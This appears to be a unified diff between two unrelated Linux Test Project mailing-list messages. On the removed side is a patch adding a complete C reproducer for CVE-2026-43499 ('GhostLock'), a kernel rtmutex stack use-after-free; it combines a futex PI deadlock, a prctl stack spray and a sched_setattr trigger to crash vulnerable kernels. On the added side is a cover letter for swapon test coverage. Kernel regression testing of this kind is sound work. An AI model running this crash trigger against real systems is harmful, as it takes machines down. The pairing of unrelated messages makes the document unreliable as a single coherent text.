@@ -4,106 +4,112 @@ X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
 Received: from picard.linux.it (picard.linux.it [213.254.12.146])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.lore.kernel.org (Postfix) with ESMTPS id B3BE7C61DD3
-	for <ltp@archiver.kernel.org>; Thu,  3 Sep 2026 12:53:49 +0000 (UTC)
+	by smtp.lore.kernel.org (Postfix) with ESMTPS id DA588C61DD3
+	for <ltp@archiver.kernel.org>; Thu,  3 Sep 2026 13:04:41 +0000 (UTC)
 Received: from picard.linux.it (localhost [IPv6:::1])
-	by picard.linux.it (Postfix) with ESMTP id 785AB3EAD9B
-	for <ltp@archiver.kernel.org>; Thu,  3 Sep 2026 14:53:47 +0200 (CEST)
-Received: from in-7.smtp.seeweb.it (in-7.smtp.seeweb.it
- [IPv6:2001:4b78:1:20::7])
+	by picard.linux.it (Postfix) with ESMTP id D41603EAD96
+	for <ltp@archiver.kernel.org>; Thu,  3 Sep 2026 15:04:39 +0200 (CEST)
+Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it [217.194.8.3])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature ECDSA (secp384r1))
  (No client certificate requested)
- by picard.linux.it (Postfix) with ESMTPS id 896063EAD85
- for <ltp@lists.linux.it>; Thu,  3 Sep 2026 14:52:16 +0200 (CEST)
-Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.223.130])
+ by picard.linux.it (Postfix) with ESMTPS id 4AE673EAD42
+ for <ltp@lists.linux.it>; Thu,  3 Sep 2026 15:04:22 +0200 (CEST)
+Received: from smtp-out2.suse.de (smtp-out2.suse.de
+ [IPv6:2a07:de40:b251:101:10:150:64:2])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
  (No client certificate requested)
- by in-7.smtp.seeweb.it (Postfix) with ESMTPS id 4D62B200B21
- for <ltp@lists.linux.it>; Thu,  3 Sep 2026 14:52:16 +0200 (CEST)
-Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
+ by in-3.smtp.seeweb.it (Postfix) with ESMTPS id 4F66A1A0107B
+ for <ltp@lists.linux.it>; Thu,  3 Sep 2026 15:04:21 +0200 (CEST)
+Received: from imap1.dmz-prg2.suse.org (imap1.dmz-prg2.suse.org
+ [IPv6:2a07:de40:b281:104:10:150:64:97])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
  (No client certificate requested)
- by smtp-out1.suse.de (Postfix) with ESMTPS id 8195421EA1;
- Thu,  3 Sep 2026 12:52:07 +0000 (UTC)
+ by smtp-out2.suse.de (Postfix) with ESMTPS id 7E9C51FE40;
+ Thu,  3 Sep 2026 13:04:12 +0000 (UTC)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
- t=1788439931; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ t=1788440656; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=xlw1/x/cuooP/KkMyIxNr8dNqny852tJgOZwYaZAS1I=;
- b=num0qpPfvm4bQRvYlxb4/Jny7KONNrzmgU7hutd9cN0IhSti4YV2tLqFyiw8FvibPz6JhL
- CV7asuwx4HsKqmTQ0cXypSWo6+VdGUDGxWeDoQsdtY4jgwCgtqxRW72WkPHUYp97tbbmV2
- z4ZH3pdeXKD1jpQBJQJ82TT9mM8GaUE=
+ content-transfer-encoding:content-transfer-encoding;
+ bh=C87ZIZnM2WRt9ALhzDkICCc4+AXtkZJF2pAb/DJMX7Y=;
+ b=ISXlzdswXXzuVcbk7uunQgB7q7wQemRoi6yi8ywksPYck87qYOzHXEPfKdzbJUDRlujUcd
+ tghqAR2rvwEFfCEXwFuWZt+hnRPyUr42oUBlOyPGVR646337In4IU9BnBzyZ9g1UAy8tTd
+ Hpb0Lqlv/vuy/4Bau12hBC7nwRAmV6E=
 DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
- s=susede2_ed25519; t=1788439931;
+ s=susede2_ed25519; t=1788440656;
  h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=xlw1/x/cuooP/KkMyIxNr8dNqny852tJgOZwYaZAS1I=;
- b=3Ldp7M9SW2MWxw51D+RF+8U9wTsxyWjBEE/2VXaL5p9eSWPE9TOyxjFPFz4cqXOVeXrnNt
- ncNkLSuaF3Mz5PCg==
-Authentication-Results: smtp-out1.suse.de;
-	none
+ content-transfer-encoding:content-transfer-encoding;
+ bh=C87ZIZnM2WRt9ALhzDkICCc4+AXtkZJF2pAb/DJMX7Y=;
+ b=3h0ZWxBYMWJ6nvr5onFCk5MJr4aDDQvLIYqkRrUTrbot+4Mop4/QOAuTfnqGpO+Am5eIL1
+ LWMRZ8yAFaCVJoCA==
+Authentication-Results: smtp-out2.suse.de;
+ dkim=pass header.d=suse.de header.s=susede2_rsa header.b=dhXhatKx;
+ dkim=pass header.d=suse.de header.s=susede2_ed25519 header.b=H8EWk3B9
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.de; s=susede2_rsa;
- t=1788439927; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
+ t=1788440652; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=xlw1/x/cuooP/KkMyIxNr8dNqny852tJgOZwYaZAS1I=;
- b=LhMp/4UK4ypVmLJZOPgsybjXFIsEJ+jVkwZy0sDtMjd3q+GcrHLIBMEhRKG6KhcW1lF9eH
- JxqOI2WDAEqRklKUEi1sCRVsmPYqLh0u6EqzLN3S6txIdjGg9gCy+6OLm64cxj4i71pws1
- 6D8kgAB0i0OFjUA8qjLCatsnhE2nr1w=
+ content-transfer-encoding:content-transfer-encoding;
+ bh=C87ZIZnM2WRt9ALhzDkICCc4+AXtkZJF2pAb/DJMX7Y=;
+ b=dhXhatKxicd20D7/5wPN/dOVkhD5Kec9uRhYBMC7CkUOD2YhKbGKmaNHyd4cYsHTYN6WuP
+ VInlq83b7HJ9D4saPor2gTOGw5mS5B4Knz6Xx40YkG+UfNq43h10CIn/JnGCT9Su0ejrxf
+ jTr4orL1HrfRgterrLLhrv6TDoOVlis=
 DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.de;
- s=susede2_ed25519; t=1788439927;
+ s=susede2_ed25519; t=1788440652;
  h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:cc:
  mime-version:mime-version:content-type:content-type:
- content-transfer-encoding:content-transfer-encoding:
- in-reply-to:in-reply-to:references:references;
- bh=xlw1/x/cuooP/KkMyIxNr8dNqny852tJgOZwYaZAS1I=;
- b=WxMFmUR9cfC5F5ZZHPDSIipgb2WVFR0+WlNle2c/ejyz/00fDkGFbK3Wl2dlnDSEeb+aCx
- GH82J+o4viFrZjBQ==
+ content-transfer-encoding:content-transfer-encoding;
+ bh=C87ZIZnM2WRt9ALhzDkICCc4+AXtkZJF2pAb/DJMX7Y=;
+ b=H8EWk3B9MC5WhdDNpafakbSulqQoECeSVCv5Iw15bFo2XhlDf7tAdcGx9DN+lrBIZ+PeiE
+ cML8DM4hoz0uFPDg==
 Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
  (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
  key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
  (No client certificate requested)
- by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id EFB4413918;
- Thu,  3 Sep 2026 12:51:59 +0000 (UTC)
+ by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 36CC5136E6;
+ Thu,  3 Sep 2026 13:04:12 +0000 (UTC)
 Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
- by imap1.dmz-prg2.suse.org with ESMTPSA id WNWLN29tmWr7MgAAD6G6ig
- (envelope-from <andrea.cervesato@suse.de>); Thu, 03 Sep 2026 12:51:59 +0000
+ by imap1.dmz-prg2.suse.org with ESMTPSA id UMHFCkxwmWojPwAAD6G6ig
+ (envelope-from <andrea.cervesato@suse.de>); Thu, 03 Sep 2026 13:04:12 +0000
 From: Andrea Cervesato <andrea.cervesato@suse.de>
-Date: Thu, 03 Sep 2026 14:51:59 +0200
+Date: Thu, 03 Sep 2026 15:04:10 +0200
+Message-Id: <20260903-swapon_discard_coverage-v4-0-2a9f721ad954@suse.com>
 MIME-Version: 1.0
-Message-Id: <20260903-cve-ghostlock-v7-5-771e99aa3057@suse.com>
-References: <20260903-cve-ghostlock-v7-0-771e99aa3057@suse.com>
-In-Reply-To: <20260903-cve-ghostlock-v7-0-771e99aa3057@suse.com>
+X-B4-Tracking: v=1; b=H4sIAEpwmWoC/43NQQrCMBQE0KtI1lb6kzaNrryHSEmTr0awKfkal
+ dK7m9ZNEUSXAzNvekYYHBLbLHoWMDpyvk2hWC6YOen2iJmzKTOec5krXmV0151va+vI6GBr4yM
+ GnWqiUBKsFAdTliytu4AH95jk3f6d6dac0VxHbmycHF19eE7XEcbe75cIWZ5JIRrTABhQsKUb4
+ cr4CxtPIp8z6jvDE4NlqZW02lZ8/cGIPxmRGBByzQsNuhL5jBmG4QWjnzhkXQEAAA==
+X-Change-ID: 20260827-swapon_discard_coverage-34861d63fc55
 To: Linux Test Project <ltp@lists.linux.it>
 X-Mailer: b4 0.16.0
-X-Developer-Signature: v=1; a=ed25519-sha256; t=1788439918; l=9954;
+X-Developer-Signature: v=1; a=ed25519-sha256; t=1788440652; l=2106;
  i=andrea.cervesato@suse.com; s=20251210; h=from:subject:message-id;
- bh=mpqu3OBxanA/su1GJX4HlMb9AgcpXa+X9GCl3eXLypg=;
- b=gjSOV91/uaZseplZuHHKISXouimdj5qrjNbzMDtcQqSrjGuh6T3l5v1q5OK2XWrFh7P6KM71r
- K/DjX0o25fCCuDg2BbAsNp2ki1P7gnjsAxOLa4PJLiFDLhBRM7P1tBM
+ bh=nATGxlbka6hh9dsesV/NS6C/OxoIkkaClc7U2LGPgz8=;
+ b=jveIkAZbtcA/2FchZZfSFvrjY9YGdELmtPRohpK5rj3EStC1axabEGAwjT0mV2QFYCAO8Bgj3
+ GYYgtT4jGSkAlY6PFIjJmeb533APsuPlWIWdTPQpPv1QryK/+JThDDC
 X-Developer-Key: i=andrea.cervesato@suse.com; a=ed25519;
  pk=zKY+6GCauOiuHNZ//d8PQ/UL4jFCTKbXrzXAOQSLevI=
-X-Spamd-Result: default: False [-4.30 / 50.00]; BAYES_HAM(-3.00)[100.00%];
+X-Rspamd-Queue-Id: 7E9C51FE40
+X-Rspamd-Server: rspamd1.dmz-prg2.suse.org
+X-Rspamd-Action: no action
+X-Spamd-Result: default: False [-4.51 / 50.00]; BAYES_HAM(-3.00)[100.00%];
  NEURAL_HAM_LONG(-1.00)[-1.000];
- NEURAL_HAM_SHORT(-0.20)[-0.996]; MIME_GOOD(-0.10)[text/plain];
- RCPT_COUNT_TWO(0.00)[2]; RCVD_TLS_ALL(0.00)[];
- RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
+ R_DKIM_ALLOW(-0.20)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
+ NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
+ MX_GOOD(-0.01)[]; RCVD_VIA_SMTP_AUTH(0.00)[]; ARC_NA(0.00)[];
+ SPAMHAUS_XBL(0.00)[2a07:de40:b281:104:10:150:64:97:from];
+ MIME_TRACE(0.00)[0:+]; RCVD_TLS_ALL(0.00)[];
  DKIM_SIGNED(0.00)[suse.de:s=susede2_rsa,suse.de:s=susede2_ed25519];
- TO_DN_ALL(0.00)[]; TO_MATCH_ENVRCPT_ALL(0.00)[];
- FROM_HAS_DN(0.00)[]; MIME_TRACE(0.00)[0:+];
- FROM_EQ_ENVFROM(0.00)[]; RCVD_COUNT_TWO(0.00)[2];
- DBL_BLOCKED_OPENRESOLVER(0.00)[nebusec.ai:email, nebusec.ai:url,
- imap1.dmz-prg2.suse.org:helo, suse.com:email, suse.com:mid]
-X-Virus-Scanned: clamav-milter 1.0.9 at in-7.smtp.seeweb.it
+ TO_DN_ALL(0.00)[]; FROM_EQ_ENVFROM(0.00)[];
+ FROM_HAS_DN(0.00)[]; RCPT_COUNT_THREE(0.00)[3];
+ RCVD_COUNT_TWO(0.00)[2]; TO_MATCH_ENVRCPT_ALL(0.00)[];
+ DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo,imap1.dmz-prg2.suse.org:rdns,suse.com:mid,suse.com:email,linux.it:email];
+ DKIM_TRACE(0.00)[suse.de:+]
+X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
 X-Virus-Status: Clean
-Subject: [LTP] [PATCH v7 5/5] cve: add CVE-2026-43499 reproducer
+Subject: [LTP] [PATCH v4 0/3] Increase coverage for swapon syscall
 X-BeenThere: ltp@lists.linux.it
 X-Mailman-Version: 2.1.29
 Precedence: list
@@ -120,340 +126,54 @@ Content-Transfer-Encoding: 7bit
 Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
 Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
 
-From: Andrea Cervesato <andrea.cervesato@suse.com>
-
-Add "Ghostlock" reproducer for CVE-2026-43499.
-
-Reproducer based on the Nebula Security writeup and open-sourced PoC
-(https://nebusec.ai/research/ionstack-part-2/,
-https://github.com/NebuSec/CyberMeowfia).
-
-Beware, this test will crash the system on a vulnerable kernel.
+Complete the EINVAL coverage on invalid input data and create a new test
+to verify discarding pages functionalities.
 
 Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
 ---
- runtest/cve               |   1 +
- testcases/cve/.gitignore  |   1 +
- testcases/cve/Makefile    |   2 +-
- testcases/cve/ghostlock.c | 271 ++++++++++++++++++++++++++++++++++++++++++++++
- 4 files changed, 274 insertions(+), 1 deletion(-)
+Changes in v4:
+- replaced the manual /proc/swaps check with .needs_kconfigs = "CONFIG_SWAP=y"
+- added .needs_cmds = "mkswap" to make sure that the binary exists
+- switched from raw tst_syscall to standard swapon() and swapoff()
+- used TST_EXP_PASS() to check the swapon() call
+- truncated the backing file before checking FALLOC_FL_PUNCH_HOLE support
+- added SAFE_FSYNC() before mkswap to flush data to disk
+- changed TTERRNO to TERRNO for swapoff() errors
+- removed redundant static flag resets in cleanup()
+- added .skip_filesystems to skip filesystems that do not support punch hole
+- Link to v3: https://lore.kernel.org/20260828-swapon_discard_coverage-v3-0-136924a1a730@suse.com
 
-diff --git a/runtest/cve b/runtest/cve
-index b096bacef..894863e33 100644
---- a/runtest/cve
-+++ b/runtest/cve
-@@ -88,6 +88,7 @@ cve-2023-1829 tcindex01
- cve-2023-0461 setsockopt10
- cve-2023-31248 nft02
- cve-2023-52879 fanotify25
-+cve-2026-43499 ghostlock
- cve-2026-53362 setsockopt11
- cve-2026-64600 refluxfs
- # Tests below may cause kernel memory leak
-diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
-index a167a8743..418d67566 100644
---- a/testcases/cve/.gitignore
-+++ b/testcases/cve/.gitignore
-@@ -16,5 +16,6 @@ tcindex01
- cve-2025-38236
- cve-2025-21756
- cve-2026-46331
-+ghostlock
- refluxfs
- sctphantom
-diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
-index 6be4999a3..b4e4178eb 100644
---- a/testcases/cve/Makefile
-+++ b/testcases/cve/Makefile
-@@ -11,7 +11,7 @@ stack_clash:	CFLAGS += -fno-optimize-sibling-calls -Wno-infinite-recursion
- 
- cve-2016-7042:	LDLIBS += $(KEYUTILS_LIBS)
- 
--cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 refluxfs:  CFLAGS += -pthread
-+cve-2014-0196 cve-2016-7117 cve-2017-2671 cve-2017-17052 cve-2017-17053 ghostlock refluxfs:  CFLAGS += -pthread
- cve-2014-0196 cve-2016-7117 cve-2017-2671:  LDLIBS += -lrt
- 
- ifneq ($(ANDROID),1)
-diff --git a/testcases/cve/ghostlock.c b/testcases/cve/ghostlock.c
-new file mode 100644
-index 000000000..71ae9e2f9
---- /dev/null
-+++ b/testcases/cve/ghostlock.c
-@@ -0,0 +1,271 @@
-+// SPDX-License-Identifier: GPL-2.0-or-later
-+/*
-+ * Copyright (c) 2026 Nebula Security <root@nebusec.ai>
-+ * Copyright (c) 2026 Linux Test Project
-+ */
-+
-+/*\
-+ * Test for CVE-2026-43499 (GhostLock), a stack use-after-free in the
-+ * rtmutex PI code, fixed in kernel v7.1:
-+ * 3bfdc63936dd ("rtmutex: Use waiter::task instead of current in
-+ * remove_waiter()")
-+ *
-+ * Reproducer based on the Nebula Security writeup and open-sourced PoC
-+ * (https://nebusec.ai/research/ionstack-part-2/ and
-+ * https://github.com/NebuSec/CyberMeowfia).
-+ * Beware, this test will crash the system on a vulnerable kernel.
-+ *
-+ * [Algorithm]
-+ *
-+ * - Set up a three-futex PI deadlock topology.
-+ * - Call :manpage:`futex(2)` with FUTEX_CMP_REQUEUE_PI on the waiter.
-+ * - On a vulnerable kernel, the rollback from -EDEADLK leaves the waiter's
-+ *   pi_blocked_on pointer dangling on its own stack.
-+ * - Waiter sprays its stack continuously via :manpage:`prctl(2)`
-+ *   (PR_SET_MM_MAP) with non-canonical addresses while main thread calls
-+ *   :manpage:`sched_setattr(2)` on the waiter to trigger a chain walk.
-+ * - The chain walk dereferences the sprayed garbage, crashing a vulnerable
-+ *   kernel.
-+ */
-+
-+#include "tst_test.h"
-+#include "tst_timer.h"
-+#include "tst_safe_clocks.h"
-+#include "tst_safe_pthread.h"
-+#include "lapi/syscalls.h"
-+#include "lapi/sched.h"
-+#include "lapi/prctl.h"
-+#include "lapi/futex.h"
-+
-+#define ATTEMPTS 128
-+#define POISON_PTR 0xdeadbee11c518f58ULL
-+#define MAX_AUXV_WORDS 48
-+
-+#define CP_CHAIN_HELD 0
-+#define CP_TARGET_HELD 1
-+#define CP_SPRAYED 2
-+
-+static uint32_t f_wait;
-+static uint32_t f_pi_target;
-+static uint32_t f_pi_chain;
-+
-+static pid_t waiter_tid;
-+static pid_t owner_tid;
-+
-+static unsigned long auxv[MAX_AUXV_WORDS];
-+static uint32_t valid_auxv_size;
-+static tst_atomic_t stop_spray;
-+
-+/*
-+ * auxv_size must fit mm->saved_auxv (AT_VECTOR_SIZE words:
-+ * 50 on current kernels, 44 on older ones)
-+ */
-+static const int try_sizes[] = {
-+	MAX_AUXV_WORDS,
-+	MAX_AUXV_WORDS - 4,
-+	MAX_AUXV_WORDS - 8
-+};
-+
-+static int futex_wait_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2,
-+				 struct timespec *ts)
-+{
-+	return tst_syscall(__NR_futex, uaddr, FUTEX_WAIT_REQUEUE_PI, 0, ts,
-+			   uaddr2, 0);
-+}
-+
-+static int futex_cmp_requeue_pi(uint32_t *uaddr, uint32_t *uaddr2)
-+{
-+	return tst_syscall(__NR_futex, uaddr, FUTEX_CMP_REQUEUE_PI, 1, 1,
-+			   uaddr2, 0);
-+}
-+
-+static void futex_lock_pi(uint32_t *uaddr)
-+{
-+	if (tst_syscall(__NR_futex, uaddr, FUTEX_LOCK_PI, 0, 0, 0, 0) == -1) {
-+		if (errno == ENOSYS)
-+			tst_brk(TCONF, "FUTEX_LOCK_PI not supported");
-+
-+		tst_brk(TBROK | TERRNO, "FUTEX_LOCK_PI failed");
-+	}
-+}
-+
-+static void futex_unlock_pi(uint32_t *uaddr)
-+{
-+	if (tst_syscall(__NR_futex, uaddr, FUTEX_UNLOCK_PI, 0, 0, 0, 0) == -1) {
-+		if (errno == ENOSYS)
-+			tst_brk(TCONF, "FUTEX_UNLOCK_PI not supported");
-+
-+		tst_brk(TBROK | TERRNO, "FUTEX_UNLOCK_PI failed");
-+	}
-+}
-+
-+static void *waiter_fn(void *arg LTP_ATTRIBUTE_UNUSED)
-+{
-+	struct timespec ts;
-+	struct prctl_mm_map mm_map = {
-+		.start_code  = (uint64_t)(uintptr_t)&waiter_fn,
-+		.end_code    = (uint64_t)(uintptr_t)&waiter_fn + 0x1000,
-+		.start_data  = (uint64_t)(uintptr_t)auxv & ~0xfffUL,
-+		.end_data    = ((uint64_t)(uintptr_t)auxv & ~0xfffUL) + 0x1000,
-+		.start_brk   = (uint64_t)(uintptr_t)sbrk(0),
-+		.brk         = (uint64_t)(uintptr_t)sbrk(0),
-+		.start_stack = (uint64_t)(uintptr_t)&mm_map,
-+		.arg_start   = (uint64_t)(uintptr_t)&mm_map,
-+		.arg_end     = (uint64_t)(uintptr_t)&mm_map,
-+		.env_start   = (uint64_t)(uintptr_t)&mm_map,
-+		.env_end     = (uint64_t)(uintptr_t)&mm_map,
-+		.auxv        = (void *)auxv,
-+		.auxv_size   = valid_auxv_size,
-+		.exe_fd      = (uint32_t)-1,
-+	};
-+
-+	waiter_tid = tst_syscall(__NR_gettid);
-+
-+	futex_lock_pi(&f_pi_chain);
-+
-+	TST_CHECKPOINT_WAKE(CP_CHAIN_HELD);
-+
-+	SAFE_CLOCK_GETTIME(CLOCK_MONOTONIC, &ts);
-+	ts = tst_timespec_add(ts, (struct timespec){ .tv_sec = 10, .tv_nsec = 0 });
-+	if (futex_wait_requeue_pi(&f_wait, &f_pi_target, &ts) != -1 ||
-+	    (errno != ETIMEDOUT && errno != EWOULDBLOCK && errno != EDEADLK)) {
-+		if (errno == ENOSYS)
-+			tst_brk(TCONF, "FUTEX_WAIT_REQUEUE_PI not supported");
-+
-+		tst_brk(TBROK | TERRNO, "futex_wait_requeue_pi() failed unexpectedly");
-+	}
-+
-+	TST_CHECKPOINT_WAKE(CP_SPRAYED);
-+
-+	while (!tst_atomic_load(&stop_spray)) {
-+		/*
-+		 * This is the syscall that poisons the buffer and it might
-+		 * fail, so we don't use the SAFE_* variant.
-+		 */
-+		prctl(PR_SET_MM, PR_SET_MM_MAP, (unsigned long)&mm_map,
-+		      sizeof(mm_map), 0);
-+	}
-+
-+	futex_unlock_pi(&f_pi_chain);
-+
-+	return NULL;
-+}
-+
-+static void *owner_fn(void *arg LTP_ATTRIBUTE_UNUSED)
-+{
-+	owner_tid = tst_syscall(__NR_gettid);
-+
-+	TST_CHECKPOINT_WAIT(CP_CHAIN_HELD);
-+
-+	futex_lock_pi(&f_pi_target);
-+	TST_CHECKPOINT_WAKE(CP_TARGET_HELD);
-+
-+	futex_lock_pi(&f_pi_chain);
-+
-+	futex_unlock_pi(&f_pi_chain);
-+	futex_unlock_pi(&f_pi_target);
-+
-+	return NULL;
-+}
-+
-+static void setup(void)
-+{
-+	struct prctl_mm_map map = {
-+		.exe_fd = (uint32_t)-1,
-+		.auxv = (void *)auxv,
-+	};
-+	unsigned int i;
-+
-+	for (i = 0; i < MAX_AUXV_WORDS; i++)
-+		auxv[i] = POISON_PTR + i * sizeof(unsigned long);
-+
-+	map.start_code = map.start_data = map.end_data =
-+	map.start_brk = map.brk = map.start_stack = map.arg_start =
-+	map.arg_end = map.env_start = map.env_end = (uint64_t)(uintptr_t)&map;
-+	map.end_code = map.start_code + 0x1000;
-+
-+	for (i = 0; i < ARRAY_SIZE(try_sizes); i++) {
-+		valid_auxv_size = try_sizes[i] * sizeof(unsigned long);
-+		map.auxv_size = valid_auxv_size;
-+
-+		if (prctl(PR_SET_MM, PR_SET_MM_MAP, &map, sizeof(map), 0) == 0)
-+			break;
-+	}
-+
-+	if (i == ARRAY_SIZE(try_sizes))
-+		tst_brk(TBROK | TERRNO, "PR_SET_MM_MAP failed for all auxv sizes");
-+
-+	tst_res(TDEBUG, "Using auxv_size = %u", valid_auxv_size);
-+}
-+
-+static void run(void)
-+{
-+	pthread_t waiter_th, owner_th;
-+	struct sched_attr attr = {
-+		.size = sizeof(attr),
-+		.sched_policy = SCHED_BATCH,
-+		.sched_nice = 19,
-+	};
-+	int i;
-+
-+	tst_res(TINFO, "Triggering PI deadlock and stack spray");
-+
-+	for (i = 0; i < ATTEMPTS; i++) {
-+		if (!tst_remaining_runtime())
-+			break;
-+
-+		f_wait = 0;
-+		f_pi_target = 0;
-+		f_pi_chain = 0;
-+		tst_atomic_store(0, &stop_spray);
-+
-+		SAFE_PTHREAD_CREATE(&waiter_th, NULL, waiter_fn, NULL);
-+		SAFE_PTHREAD_CREATE(&owner_th, NULL, owner_fn, NULL);
-+
-+		TST_CHECKPOINT_WAIT(CP_TARGET_HELD);
-+
-+		if (TST_THREAD_STATE_WAIT(owner_tid, 'S', 10000))
-+			tst_brk(TBROK | TERRNO, "owner thread did not block");
-+
-+		if (TST_THREAD_STATE_WAIT(waiter_tid, 'S', 10000))
-+			tst_brk(TBROK | TERRNO, "waiter thread did not block");
-+
-+		TEST(futex_cmp_requeue_pi(&f_wait, &f_pi_target));
-+		if (TST_ERR == ENOSYS)
-+			tst_brk(TCONF, "FUTEX_CMP_REQUEUE_PI not supported");
-+		if (TST_RET != -1 || TST_ERR != EDEADLK)
-+			tst_brk(TBROK | TTERRNO, "FUTEX_CMP_REQUEUE_PI did not return -EDEADLK");
-+
-+		TST_CHECKPOINT_WAIT2(CP_SPRAYED, 18000);
-+
-+		SAFE_SCHED_SETATTR(waiter_tid, &attr, 0);
-+
-+		tst_atomic_store(1, &stop_spray);
-+
-+		SAFE_PTHREAD_JOIN(waiter_th, NULL);
-+		SAFE_PTHREAD_JOIN(owner_th, NULL);
-+	}
-+
-+	if (i < ATTEMPTS)
-+		tst_res(TINFO, "Runtime exhausted, executed %d/%d attempts", i, ATTEMPTS);
-+
-+	tst_res(TPASS, "Kernel survived %d GhostLock trigger attempts", i);
-+}
-+
-+static struct tst_test test = {
-+	.setup = setup,
-+	.test_all = run,
-+	.runtime = 180,
-+	.needs_checkpoints = 1,
-+	.needs_kconfigs = (const char *[]) {
-+		"CONFIG_CHECKPOINT_RESTORE=y",
-+		"CONFIG_FUTEX_PI=y",
-+		NULL
-+	},
-+	.taint_check = TST_TAINT_W | TST_TAINT_D,
-+	.tags = (const struct tst_tag[]) {
-+		{"linux-git", "3bfdc63936dd"},
-+		{"CVE", "2026-43499"},
-+		{}
-+	},
-+};
+Changes in v3:
+- better description for fallbacks
+- swapon02: make sure we swapoff() if swapon() accidentally pass
+- Link to v2: https://lore.kernel.org/20260828-swapon_discard_coverage-v2-0-e55a86dad729@suse.com
 
--- 
-2.51.0
+Changes in v2:
+- ensure buffer is flushed after discard using fsync()
+- add messages to show what test cases we are running
+- Link to v1: https://lore.kernel.org/20260827-swapon_discard_coverage-v1-0-633bcb11c181@suse.com
+
+To: Linux Test Project <ltp@lists.linux.it>
+
+---
+Andrea Cervesato (3):
+      tse_swap: Add fallback definitions for swapon
+      swapon04: Add test for discard flags
+      swapon02: Add test cases for invalid swapflags
+
+ include/tse_swap.h                          |  16 +++
+ runtest/syscalls                            |   1 +
+ testcases/kernel/syscalls/swapon/.gitignore |   1 +
+ testcases/kernel/syscalls/swapon/swapon02.c |  59 ++++++--
+ testcases/kernel/syscalls/swapon/swapon04.c | 208 ++++++++++++++++++++++++++++
+ 5 files changed, 270 insertions(+), 15 deletions(-)
+---
+base-commit: 12724413534a6d4160ff9694ba6f09daa4ccb6bd
+change-id: 20260827-swapon_discard_coverage-34861d63fc55
+
+Best regards,
+--  
+Andrea Cervesato <andrea.cervesato@suse.com>
 
 
 -- 
